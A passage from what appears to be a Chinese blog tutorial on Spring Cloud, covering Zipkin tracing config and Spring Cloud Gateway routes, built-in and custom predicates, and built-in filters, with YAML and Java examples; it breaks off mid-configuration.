<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ========================zipkin===================</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">zipkin:</span></span><br><span class="line">    <span class="attr">tracing:</span></span><br><span class="line">      <span class="attr">endpoint:</span> <span class="string">http://localhost:9411/api/v2/spans</span></span><br><span class="line">  <span class="attr">tracing:</span></span><br><span class="line">    <span class="attr">sampling:</span></span><br><span class="line">      <span class="attr">probability:</span> <span class="number">1.0</span> <span class="comment">#采样率默认为0.1(0.1就是10次只能有一次被记录下来)，值越大收集越及时。</span></span><br></pre></td></tr></table></figure>



<p>运行后在Zipkin操作网站<code>http://127.0.0.1:9411/zipkin/</code>即可查看链路调用情况。</p>
<hr>
<h2 id="Gateway新一代网关"><a href="#Gateway新一代网关" class="headerlink" title="Gateway新一代网关"></a>Gateway新一代网关</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p><strong>Spring Cloud Gateway</strong> 是 Spring 官方推出的一款基于 Spring 5 和 Project Reactor 的高性能、响应式网关组件，主要用于微服务架构中的请求路由和过滤处理，是原本Zuu.xx的替代版。在微服务架构中，系统被拆分为多个独立部署的小服务，每个服务通常运行在不同的地址和端口上。如果没有统一的入口，客户端需要直接与各个微服务交互，这会导致复杂的请求管理和维护问题。而 Gateway  作为微服务系统的统一网关，通过路由映射将外部请求转发到内部对应的服务实例，隐藏了服务的具体地址和端口信息，简化了客户端的调用逻辑。同时，Gateway 还能提供动态路由、负载均衡、权限校验、日志记录等功能，增强了系统的灵活性和安全性。因此，在微服务项目中引入 Gateway  不仅能够实现请求的集中管理，还能提升系统的可维护性和扩展性，满足复杂业务场景的需求。</p>
<p><strong>作用</strong></p>
<ol>
<li><strong>统一入口</strong>：作为微服务系统的统一入口，将外部请求转发到内部不同的服务实例。</li>
<li><strong>动态路由</strong>：根据配置规则灵活地将请求路由到对应的服务，支持路径匹配、主机匹配等。</li>
<li><strong>请求过滤</strong>：通过全局或局部过滤器对请求进行预处理（如认证、限流、日志记录）或后处理（如响应修改）。</li>
<li><strong>负载均衡</strong>：与 Spring Cloud LoadBalancer 集成，实现客户端负载均衡，分发请求到多个服务实例。</li>
<li><strong>安全控制</strong>：支持集成 OAuth2 等安全机制，对请求进行身份验证和授权。</li>
<li><strong>性能优化</strong>：基于响应式编程模型，具备高并发和低延迟的特性，适合现代微服务架构。</li>
</ol>
<h4 id="三大核心"><a href="#三大核心" class="headerlink" title="三大核心"></a>三大核心</h4><p>Spring Cloud Gateway 的三大核心组件是 <strong>Route（路由）</strong>、<strong>Predicate（断言）</strong> 和 <strong>Filter（过滤器）</strong>，它们共同决定了网关的行为和功能：</p>
<ol>
<li><p><strong>Route（路由）</strong>：<br>路由是网关的基本配置单元，定义了请求如何被转发到目标服务。每个路由包含一个 ID、目标 URI 和一组 Predicate（断言）与 Filter（过滤器）。只有当 Predicate 条件匹配时，该路由才会生效。</p>
</li>
<li><p><strong>Predicate（断言）</strong>：<br>断言用于定义匹配规则，决定哪些请求可以进入某个路由。它基于 Java 8 的 <code>Predicate</code> 函数式接口，支持多种匹配条件（如路径、方法、查询参数、头信息等）。例如，可以通过路径 <code>/api/user/**</code> 匹配所有以该路径开头的请求。</p>
</li>
<li><p><strong>Filter（过滤器）</strong>：<br>过滤器用于对请求或响应进行处理，包括修改请求头、响应体、日志记录、权限校验等功能。Gateway 提供了两种类型的过滤器：全局过滤器（Global Filter，对所有请求生效）和局部过滤器（Route Filter，仅对特定路由生效）。</p>
</li>
</ol>
<p>总结来说，<strong>Route 定义了请求的目标地址，Predicate 决定请求是否匹配某个路由，而 Filter 则负责对请求和响应进行加工和控制。</strong>这三者共同构成了 Spring Cloud Gateway 的核心功能。</p>
<h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>客户端向 Spring Cloud Gateway 发出请求。然后在 Gateway Handler Mapping 中找到与请求相匹配的路由，将其发送到 Gateway Web Handler。Handler 再通过指定的过滤器链来将请求发送到我们实际的服务执行业务逻辑，然后返回。</p>
<p>过滤器之间用虚线分开是因为过滤器可能会在发送代理请求之前(Pre)或之后(Post)执行业务逻辑。</p>
<p>在“pre”类型的过滤器可以做参数校验、权限校验、流量监控、日志输出、协议转换等;</p>
<p>在“post”类型的过滤器中可以做响应内容、响应头的修改，日志的输出，流量监控等有着非常重要的作用。</p>
<h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><h4 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h4><p>GateWay网关是一个微服务，因此需要新建一个子模块。</p>
<p><strong>步骤1：修改POM文件，引入依赖</strong></p>
<p>微服务需要注册到服务注册中心consul</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--gateway--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--服务注册发现consul discovery,网关也要注册进服务注册中心统一管控--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-consul-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指标监控健康检查的actuator,网关是响应式编程删除掉spring-boot-starter-web dependency--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：编写YAML文件，配置运行端口等信息</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span> <span class="comment">#以微服务注册进consul或nacos服务列表内</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span> <span class="comment">#配置consul地址</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤3：编写主启动类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span> <span class="comment">//服务注册和发现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main9527</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        SpringApplication.run(Main9527.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="路由映射配置"><a href="#路由映射配置" class="headerlink" title="路由映射配置"></a>路由映射配置</h4><p>当前，服务提供者模块是直接对外保留自己的访问地址和端口的，这会带来安全性问题。通过路由映射配置，可以将Gateway  作为系统的统一入口，可以将微服务的实际地址和端口隐藏起来，避免直接暴露给外部客户端，从而减少被恶意攻击的风险。</p>
<p><strong>步骤1：修改网关模块yaml配置文件，说明路由映射</strong></p>
<p>向网关说明，在uri地址下是否可以断言接口path的存在</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">      	  <span class="comment"># 路由的ID(类似mysql主键ID)，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">pay_routh1</span> <span class="comment">#pay_routh1</span></span><br><span class="line">          <span class="comment"># 匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span>    </span><br><span class="line">          <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/pay/gateway/get/**</span>                           </span><br></pre></td></tr></table></figure>

<p>此后，通过网关地址端口+Path即可访问服务提供者模块的接口，不会暴露服务提供者的接口。</p>
<p><strong>步骤2：修改工具类Feign接口的@FeignClient，通过网关调用服务</strong></p>
<p>一般情况下，一个公司内部的服务互相调用直接通过微服务名称调用即可，但公司外部调用应该通过网关调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 内部服务相互调用，直接通过服务名</span></span><br><span class="line"><span class="comment">// @FeignClient(value = &quot;cloud-payment-service&quot;)</span></span><br><span class="line"><span class="comment">// 提供给外部服务调用的接口，需要通过网关</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;cloud-gateway&quot;)</span><span class="comment">//</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PayFeignApi</span> &#123;</span><br></pre></td></tr></table></figure>





<h3 id="动态获取服务URI"><a href="#动态获取服务URI" class="headerlink" title="动态获取服务URI"></a>动态获取服务URI</h3><p>以上方法中，服务的URI是固定写在YAML文件中的，如果服务崩溃，无法切换URI，因此需要按服务名访问而不是URI。</p>
<p><strong>方法：修改网关yaml配置文件，使用微服务名替换URI访问</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">  <span class="comment"># 路由的ID(类似mysql主键ID)，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">id:</span> <span class="string">pay_routh1</span> <span class="comment">#pay_routh1</span></span><br><span class="line">  <span class="comment"># 匹配后提供服务的路由地址</span></span><br><span class="line">  <span class="comment"># uri: http://localhost:8001  </span></span><br><span class="line"><span class="comment"># ***** 修改如下 ******</span></span><br><span class="line">  <span class="attr">uri:</span> <span class="string">lb://cloud-payment-service</span></span><br><span class="line">  <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="attr">predicates:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Path=/pay/gateway/get/**</span> </span><br></pre></td></tr></table></figure>



<h3 id="Predicate断言"><a href="#Predicate断言" class="headerlink" title="Predicate断言"></a>Predicate断言</h3><p><code>Route Predicate Factories</code>是 Spring Cloud Gateway 中用于创建和配置路由断言（Predicate）的工厂类。它封装了常见的匹配规则逻辑，使开发者能够通过简单的配置快速定义复杂的路由匹配条件，而无需手动编写复杂的代码。</p>
<p>Route Predicate Factories 提供了一系列内置的断言生成器，每个生成器对应一种匹配规则（如路径匹配、方法匹配、头信息匹配等）。<strong>开发者可以通过配置文件或代码方式调用这些生成器，并传入相应的参数来定义路由规则。</strong>例如，<code>Path Route Predicate Factory</code> 用于根据请求路径匹配路由，<code>Method Route Predicate Factory</code> 用于根据 HTTP 方法匹配路由。</p>
<h4 id="内置断言配置"><a href="#内置断言配置" class="headerlink" title="内置断言配置"></a>内置断言配置</h4><p><strong>Route Predicate Factories</strong> 提供了许多常用的内置断言 API，用于灵活定义路由匹配规则。以下是部分常见的内置断言及其功能：</p>
<ol>
<li>**<code>After Route Predicate</code>**：匹配在指定日期之后的请求。例如，可以配置只允许某个时间点之后的请求通过。</li>
<li>**<code>Before Route Predicate</code>**：匹配在指定日期之前的请求。适用于限制某些过期功能的访问。</li>
<li>**<code>Between Route Predicate</code>**：匹配发生在两个指定日期之间的请求。常用于临时活动或功能的启用。</li>
<li>**<code>Path Route Predicate</code>**：根据请求路径进行匹配。例如，匹配以 <code>/api/user/**</code> 开头的所有请求。</li>
<li>**<code>Method Route Predicate</code>**：根据 HTTP 请求方法（如 GET、POST 等）进行匹配。</li>
<li>**<code>Header Route Predicate</code>**：根据请求头中的字段和值进行匹配。例如，匹配包含特定头信息的请求。</li>
<li>**<code>Query Route Predicate</code>**：根据查询参数的存在与否或具体值进行匹配。</li>
<li>**<code>Cookie Route Predicate</code>**：根据请求中携带的 Cookie 名称和值进行匹配。</li>
<li>**<code>Host Route Predicate</code>**：根据请求的目标主机名进行匹配。</li>
<li>**<code>RemoteAddr Route Predicate</code>**：根据客户端的 IP 地址或地址范围进行匹配。</li>
</ol>
<p><strong>多个API可以同时使用，必须全部满足才能访问</strong></p>
<p><strong>支持通配符的断言</strong>：</p>
<ul>
<li><code>Path</code>：支持路径匹配中的通配符（如 <code>/**</code> 或 <code>/*.html</code>）。</li>
<li><code>Host</code>：支持主机名匹配中的通配符（如 <code>*.example.com</code> 或 <code>**.example.com</code>）。</li>
<li><code>Cookie</code> 和 <code>Header</code>：支持正则表达式形式的匹配，可以包含通配符（如 <code>\d+</code> 或 <code>^\w&#123;32&#125;$</code>）。</li>
</ul>
<h5 id="After-配置"><a href="#After-配置" class="headerlink" title="After 配置"></a>After 配置</h5><p>在指定日期之后可以访问</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/pay/gateway/get/**</span>              <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">After=2025-03-01T22:10:47.498163700+08:00[Asia/Shanghai]</span> <span class="comment"># 在此时间后可以访问</span></span><br></pre></td></tr></table></figure>

<p> 时间戳可以通过如下代码获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ZonedDateTime</span> <span class="variable">zbj</span> <span class="operator">=</span> ZonedDateTime.now(); <span class="comment">// 默认时区</span></span><br><span class="line">System.out.println(zbj);</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Before-配置"><a href="#Before-配置" class="headerlink" title="Before 配置"></a>Before 配置</h5><p>在指定日期之前可以访问  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/promotion/event/**</span>              <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Before=2025-03-01T22:10:47.498163700+08:00[Asia/Shanghai]</span> <span class="comment"># 在此时间前可以访问</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Between-配置"><a href="#Between-配置" class="headerlink" title="Between 配置"></a>Between 配置</h5><p>在指定的两个日期之间可以访问  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/sale/campaign/**</span>               <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Between=2025-03-01T00:00:00.000+08:00[Asia/Shanghai],2025-03-31T23:59:59.999+08:00[Asia/Shanghai]</span> <span class="comment"># 在此时间段内可以访问</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Method-配置"><a href="#Method-配置" class="headerlink" title="Method 配置"></a>Method 配置</h5><p>根据 HTTP 请求方法进行匹配  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/api/resource/**</span>                <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Method=GET</span>                           <span class="comment"># 仅允许 GET 方法访问</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Header-配置"><a href="#Header-配置" class="headerlink" title="Header 配置"></a>Header 配置</h5><p>根据请求头中的字段和值进行匹配  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/auth/service/**</span>                <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Header=X-Auth-Token,</span> <span class="string">\d+</span>             <span class="comment"># 匹配请求头中包含 &quot;X-Auth-Token&quot; 且值为数字的请求</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Query-配置"><a href="#Query-配置" class="headerlink" title="Query 配置"></a>Query 配置</h5><p>根据查询参数的存在与否或具体值进行匹配  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/search/products/**</span>             <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Query=category,electronics</span>           <span class="comment"># 匹配查询参数中包含 &quot;category=electronics&quot; 的请求</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Cookie-配置"><a href="#Cookie-配置" class="headerlink" title="Cookie 配置"></a>Cookie 配置</h5><p>根据请求中携带的 Cookie 名称和值进行匹配  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/user/profile/**</span>                <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Cookie=sessionId,</span> <span class="string">^\w&#123;32&#125;$</span>          <span class="comment"># 匹配携带名为 &quot;sessionId&quot; 且值为 32 位字母数字字符串的 Cookie</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Host-配置"><a href="#Host-配置" class="headerlink" title="Host 配置"></a>Host 配置</h5><p>根据请求的目标主机名进行匹配  </p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/website/**</span>                     <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Host=**.example.com</span>                 <span class="comment"># 匹配主机名为 example.com 或其子域名的请求</span></span><br></pre></td></tr></table></figure>

<p>此配置允许仅当请求的主机名符合指定规则时，才对相应路径的请求进行路由。支持通配符（<code>*</code> 和 <code>**</code>）以灵活匹配不同层级的域名。</p>
<h4 id="自定义断言配置"><a href="#自定义断言配置" class="headerlink" title="自定义断言配置"></a>自定义断言配置</h4><h5 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h5><p><strong>步骤1：定义一个XXXRoutePredicateFactory类，继承AbstractRoutePredicateFactory类</strong></p>
<p><strong>步骤2：在Factory类内部编写config配置类</strong></p>
<p><strong>步骤3：编写无参构造函数</strong></p>
<p><strong>步骤4：重写apply方法</strong></p>
<p><strong>步骤5：重写shortcutFieldOrder方法，开启短格式配置支持</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRoutePredicateFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractRoutePredicateFactory</span>&lt;MyRoutePredicateFactory.Config&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 无参构造函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyRoutePredicateFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(MyRoutePredicateFactory.Config.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Validated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">        <span class="meta">@Setter</span></span><br><span class="line">        <span class="meta">@Getter</span></span><br><span class="line">        <span class="meta">@NotEmpty</span></span><br><span class="line">        <span class="keyword">private</span> String userType; <span class="comment">//钻、金、银等用户等级</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">shortcutFieldOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.singletonList(<span class="string">&quot;userType&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Predicate&lt;ServerWebExchange&gt; <span class="title function_">apply</span><span class="params">(MyRoutePredicateFactory.Config config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Predicate</span>&lt;ServerWebExchange&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">test</span><span class="params">(ServerWebExchange serverWebExchange)</span> &#123;</span><br><span class="line">                <span class="comment">//检查request的参数里面，userType是否为指定的值，符合配置就通过</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">userType</span> <span class="operator">=</span> serverWebExchange.getRequest().getQueryParams().getFirst(<span class="string">&quot;userType&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (userType == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//如果说参数存在，就和config的数据进行比较</span></span><br><span class="line">                <span class="keyword">if</span> (userType.equals(config.getUserType())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">predicates:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Path=/pay/gateway/get/**</span>              <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">My=gold</span></span><br><span class="line">  <span class="comment"># 如果没有重写shortcutFieldOrder方法，需要按如下方法配置</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">My</span></span><br><span class="line">    <span class="attr">args:</span></span><br><span class="line">      <span class="attr">userType:</span> <span class="string">diamond</span></span><br></pre></td></tr></table></figure>



<h3 id="Filter过滤器"><a href="#Filter过滤器" class="headerlink" title="Filter过滤器"></a>Filter过滤器</h3><p><strong>Gateway 的 Filter（过滤器）</strong> 是 Spring Cloud Gateway 中用于对请求和响应进行加工处理的核心组件。它可以在请求到达目标服务之前或响应返回客户端之前，执行一系列预定义的操作，例如修改请求头、响应体、记录日志、实现权限校验等。Filter可以分为：</p>
<ol>
<li><p><strong>全局过滤器（Global Filter）</strong>：<br>对所有路由生效，通常用于实现跨切面的功能，如统一鉴权、日志记录、流量监控等。<strong>无需在配置文件配置</strong></p>
</li>
<li><p><strong>局部过滤器（Route Filter）</strong>：<br>仅对特定路由生效，用于针对某个服务或路径定制化处理逻辑，如重写请求路径、修改响应内容等。</p>
</li>
<li><p><strong>自定义过滤器</strong></p>
</li>
</ol>
<p><strong>作用</strong></p>
<ul>
<li><strong>请求预处理</strong>：在请求转发到后端服务之前，可以添加、修改或删除请求头、参数等。</li>
<li><strong>响应后处理</strong>：在后端服务返回响应后，可以调整响应内容、格式化数据或添加额外信息。</li>
<li><strong>安全性增强</strong>：实现请求校验、令牌验证等功能，确保只有合法请求能访问后端服务。</li>
<li><strong>性能优化</strong>：通过压缩请求&#x2F;响应数据、缓存结果等方式提升系统效率。</li>
</ul>
<h4 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h4><p>共计38个，参考<a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#gatewayfilter-factories">官网</a></p>
<p>以下是将 Spring Cloud Gateway 的常用内置过滤器按分类整理的 3 列表格，包含分类、过滤器名称及用途说明：</p>
<table>
<thead>
<tr>
<th><strong>分类</strong></th>
<th><strong>过滤器名称</strong></th>
<th><strong>用途说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>请求头相关</td>
<td><code>AddRequestHeader</code></td>
<td>在转发请求时<code>添加</code>指定的请求头。</td>
</tr>
<tr>
<td></td>
<td><code>RemoveRequestHeader</code></td>
<td>在转发请求时<code>移除</code>指定的请求头。</td>
</tr>
<tr>
<td></td>
<td><code>SetRequestHeader</code></td>
<td>在转发请求时将指定请求头的值<code>改</code>为新值</td>
</tr>
<tr>
<td>请求参数相关</td>
<td><code>AddRequestParameter</code></td>
<td>添加请求参数</td>
</tr>
<tr>
<td></td>
<td><code>RemoveRequestParameter</code></td>
<td>移除请求参数</td>
</tr>
<tr>
<td></td>
<td><code>RequestRateLimiter</code></td>
<td>根据请求参数限制请求速率，常用于实现限流功能。</td>
</tr>
<tr>
<td></td>
<td><code>ModifyRequestBody</code></td>
<td>修改请求体内容，适用于需要对请求数据进行加工的场景。</td>
</tr>
<tr>
<td>响应头相关</td>
<td><code>AddResponseHeader</code></td>
<td>在返回响应时添加指定的响应头。</td>
</tr>
<tr>
<td></td>
<td><code>SetResponseHeader</code></td>
<td>在返回响应时将指定的响应头的值<code>改</code>为新值</td>
</tr>
<tr>
<td></td>
<td><code>RemoveResponseHeader</code></td>
<td>在返回响应时移除指定的响应头。</td>
</tr>
<tr>
<td>前缀与路径相关</td>
<td><code>PrefixPath</code></td>
<td>为请求路径添加前缀，通常用于路由重写。</td>
</tr>
<tr>
<td></td>
<td><code>StripPrefix</code></td>
<td>移除请求路径中的指定前缀，便于后端服务处理标准化路径。</td>
</tr>
<tr>
<td></td>
<td><code>RewritePath</code></td>
<td>重写请求路径，支持灵活的路径映射规则。</td>
</tr>
<tr>
<td></td>
<td><code>RedirectTo</code></td>
<td>将请求重定向到指定的目标 URL，支持 301（永久重定向）或 302（临时重定向）。</td>
</tr>
<tr>
<td></td>
<td><code>SetPath</code></td>
<td>直接设置请求的新路径，替换原始路径，适用于需要完全重写路径的场景。</td>
</tr>
<tr>
<td>其他</td>
<td><code>PreserveHostHeader</code></td>
<td>保留原始请求的 Host 头信息，避免被网关修改。</td>
</tr>
<tr>
<td></td>
<td><code>Retry</code></td>
<td>对失败的请求进行重试，提升系统容错能力。</td>
</tr>
<tr>
<td></td>
<td><code>Hystrix</code></td>
<td>集成 Hystrix 实现熔断降级功能（已进入维护模式）。</td>
</tr>
<tr>
<td></td>
<td><code>SaveSession</code></td>
<td>强制在请求转发之前保存会话信息，适用于 WebFlux 场景。</td>
</tr>
</tbody></table>
<h5 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">pay_routh3</span> <span class="comment">#pay_routh3</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://cloud-payment-service</span>                <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/pay/gateway/filter/**</span>              <span class="comment"># 断言，路径相匹配的进行路由</span></span><br><span class="line">            <span class="comment">#  - 